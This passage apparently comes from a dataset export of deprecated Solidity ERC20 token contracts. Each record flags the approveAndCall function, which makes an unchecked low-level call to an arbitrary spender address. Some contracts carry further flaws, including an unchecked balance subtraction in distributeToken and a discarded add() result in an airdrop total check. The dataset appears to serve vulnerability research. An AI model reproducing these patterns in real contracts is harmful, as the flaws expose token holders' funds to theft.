  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 10000;\n totalSupply = 10000;\n name = \"REAL MADRID TOKEN\";\n decimals = 0;\n symbol = \"RMA\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1563"
  },
  "filename": "34421.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 1000000000;\n totalSupply = 1000000000;\n name = \"Lizi\";\n decimals = 8;\n symbol = \"Lizi\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1564"
  },
  "filename": "34422.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 1000000000;\n totalSupply = 1000000000;\n name = \"Lizi\";\n decimals = 0;\n symbol = \"Lizi\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1565"
  },
  "filename": "34423.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 1000000000;\n totalSupply = 1000000000;\n name = \"NAME OF YOUR TOKEN HERE\";\n decimals = 0;\n symbol = \"SYM\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1566"
  },
  "filename": "34438.sol",
  "content": "contract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract HumanStandardToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function HumanStandardToken(\n ) {\n balances[msg.sender] = 1000000000000000;\n totalSupply = 1000000000000000;\n name = \"Kem Credit\";\n decimals = 8;\n symbol = \"KMC\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1567"
  },
  "filename": "34456.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function distributeToken(address[] addresses, uint256 _value) {\n for (uint i = 0; i < addresses.length; i++) {\n balances[msg.sender] -= _value;\n balances[addresses[i]] += _value;\n Transfer(msg.sender, addresses[i], _value);\n }\n}\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n totalSupply = 12 * 10 ** 24;\n balances[msg.sender] = totalSupply;\n name = \"EETHER\";\n decimals = 18;\n symbol = \"EETHER\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1568"
  },
  "filename": "34461.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 1000000000000000;\n totalSupply = 1000000000000000;\n name = \"Kem Credit\";\n decimals = 8;\n symbol = \"KMC\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1569"
  },
  "filename": "34463.sol",
  "content": "pragma solidity ^0.4.13;\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) public constant returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public constant returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\nlibrary SafeERC20 {\n function safeTransfer(ERC20Basic token, address to, uint256 value) internal {\n assert(token.transfer(to, value));\n }\n function safeTransferFrom(ERC20 token, address from, address to, uint256 value) internal {\n assert(token.transferFrom(from, to, value));\n }\n function safeApprove(ERC20 token, address spender, uint256 value) internal {\n assert(token.approve(spender, value));\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal constant returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public constant returns (uint256 balance) {\n return balances[_owner];\n }\n}\ncontract Delivery is Ownable{\n using SafeMath for uint256;\n uint256 public Airdropsamount;\n uint256 public decimals;\n Peculium public pecul;\n bool public initPecul;\n event AirdropOne(address airdropaddress,uint256 nbTokenSendAirdrop);\n event AirdropList(address[] airdropListAddress,uint256[] listTokenSendAirdrop);\n event InitializedToken(address contractToken);\n function Delivery(){\n Airdropsamount = 28000000;\n initPecul = false;\n }\n function InitPeculiumAdress(address peculAdress) onlyOwner\n {\n pecul = Peculium(peculAdress);\n decimals = pecul.decimals();\n initPecul = true;\n InitializedToken(peculAdress);\n }\n function airdropsTokens(address[] _vaddr, uint256[] _vamounts) onlyOwner Initialize NotEmpty\n {\n require (Airdropsamount >0);\n require ( _vaddr.length == _vamounts.length );\n uint256 amountToSendTotal = 0;\n for (uint256 indexTest=0; indexTest<_vaddr.length; indexTest++)\n {\n amountToSendTotal.add(_vamounts[indexTest]);\n }\n require(amountToSendTotal<=Airdropsamount);\n for (uint256 index=0; index<_vaddr.length; index++)\n {\n address toAddress = _vaddr[index];\n uint256 amountTo_Send = _vamounts[index].mul(10 ** decimals);\n pecul.transfer(toAddress,amountTo_Send);\n AirdropOne(toAddress,amountTo_Send);\n }\n Airdropsamount = Airdropsamount.sub(amountToSendTotal);\n AirdropList(_vaddr,_vamounts);\n }\n modifier NotEmpty {\n require (Airdropsamount>0);\n _;\n }\n modifier Initialize {\n require (initPecul==true);\n _;\n }\n }\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) internal allowed;\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n uint256 _allowance = allowed[_from][msg.sender];\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = _allowance.sub(_value);\n Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n function increaseApproval (address _spender, uint _addedValue) public returns (bool success) {\n allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);\n Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval (address _spender, uint _subtractedValue) public returns (bool success) {\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n}\ncontract BurnableToken is StandardToken {\n event Burn(address indexed burner, uint256 value);\n function burn(uint256 _value) public {\n require(_value > 0);\n require(_value <= balances[msg.sender]);\n address burner = msg.sender;\n balances[burner] = balances[burner].sub(_value);\n totalSupply = totalSupply.sub(_value);\n Burn(burner, _value);\n }\n}\ncontract Peculium is BurnableToken,Ownable {\n using SafeMath for uint256;\n using SafeERC20 for ERC20Basic;\n string public name = \"Peculium\";\n string public symbol = \"PCL\";\n uint256 public decimals = 8;\n uint256 public constant MAX_SUPPLY_NBTOKEN = 20000000000*10**8;\n uint256 public dateStartContract;\n mapping(address => bool) public balancesCanSell;\n uint256 public dateDefrost;\n event FrozenFunds(address target, bool frozen);\n event Defroze(address msgAdd, bool freeze);\n function Peculium() {\n totalSupply = MAX_SUPPLY_NBTOKEN;\n balances[owner] = totalSupply;\n balancesCanSell[owner] = true;\n dateStartContract=now;\n dateDefrost = dateStartContract + 85 days;\n }\n function defrostToken() public\n {\n require(now>dateDefrost);\n balancesCanSell[msg.sender]=true;\n Defroze(msg.sender,true);\n }\n function transfer(address _to, uint256 _value) public returns (bool)\n {\n require(balancesCanSell[msg.sender]);\n return BasicToken.transfer(_to,_value);\n }\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool)\n {\n require(balancesCanSell[msg.sender]);\n return StandardToken.transferFrom(_from,_to,_value);\n }\n function freezeAccount(address target, bool canSell) onlyOwner\n {\n balancesCanSell[target] = canSell;\n FrozenFunds(target, canSell);\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n require(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n function getBlockTimestamp() constant returns (uint256)\n {\n return now;\n }\n function getOwnerInfos() constant returns (address ownerAddr, uint256 ownerBalance)\n {\n ownerAddr = owner;\n ownerBalance = balanceOf(ownerAddr);\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nrequire(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb156a"
  },
  "filename": "34464.sol",
  "content": "pragma solidity ^0.4.13;\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) public constant returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public constant returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\nlibrary SafeERC20 {\n function safeTransfer(ERC20Basic token, address to, uint256 value) internal {\n assert(token.transfer(to, value));\n }\n function safeTransferFrom(ERC20 token, address from, address to, uint256 value) internal {\n assert(token.transferFrom(from, to, value));\n }\n function safeApprove(ERC20 token, address spender, uint256 value) internal {\n assert(token.approve(spender, value));\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal constant returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public constant returns (uint256 balance) {\n return balances[_owner];\n }\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) internal allowed;\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n uint256 _allowance = allowed[_from][msg.sender];\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = _allowance.sub(_value);\n Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n function increaseApproval (address _spender, uint _addedValue) public returns (bool success) {\n allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);\n Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval (address _spender, uint _subtractedValue) public returns (bool success) {\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n}\ncontract BurnableToken is StandardToken {\n event Burn(address indexed burner, uint256 value);\n function burn(uint256 _value) public {\n require(_value > 0);\n require(_value <= balances[msg.sender]);\n address burner = msg.sender;\n balances[burner] = balances[burner].sub(_value);\n totalSupply = totalSupply.sub(_value);\n Burn(burner, _value);\n }\n}\ncontract Peculium is BurnableToken,Ownable {\n using SafeMath for uint256;\n using SafeERC20 for ERC20Basic;\n string public name = \"Peculium\";\n string public symbol = \"PCL\";\n uint256 public decimals = 8;\n uint256 public constant MAX_SUPPLY_NBTOKEN = 20000000000*10**8;\n uint256 public dateStartContract;\n mapping(address => bool) public balancesCanSell;\n uint256 public dateDefrost;\n event FrozenFunds(address target, bool frozen);\n event Defroze(address msgAdd, bool freeze);\n function Peculium() {\n totalSupply = MAX_SUPPLY_NBTOKEN;\n balances[owner] = totalSupply;\n balancesCanSell[owner] = true;\n dateStartContract=now;\n dateDefrost = dateStartContract + 85 days;\n }\n function defrostToken() public\n {\n require(now>dateDefrost);\n balancesCanSell[msg.sender]=true;\n 